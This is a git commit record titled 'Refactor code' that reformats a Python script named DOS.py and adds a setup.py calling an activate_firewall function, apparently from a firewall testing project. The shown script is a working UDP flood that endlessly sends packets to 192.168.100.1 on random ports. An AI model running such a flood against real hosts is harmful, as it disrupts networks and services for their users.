3037c69bed8cbfd49a687c7c7d8982a3f306b4a0
konradr33 <32595283+konradr33@users.noreply.github.com>
2021-04-21 21:48:45 +0200

    Refactor code

--- scripts/DOS.py
+++ scripts/DOS.py
@@ -4,8 +4,8 @@ import random
 UDP_IP = "192.168.100.1"
 MESSAGE = ""
 
-sock = socket.socket(socket.AF_INET, # Internet
-                     socket.SOCK_DGRAM) # UDP
+sock = socket.socket(socket.AF_INET,  # Internet
+                     socket.SOCK_DGRAM)  # UDP
 
 while True:
     sock.sendto(MESSAGE.encode(), (UDP_IP, random.randint(1, 65535)))
---
+++ setup.py
@@ -0,0 +1,4 @@
+from active_firewall.active_firewall import activate_firewall
+
+if __name__ == '__main__':
+    activate_firewall()
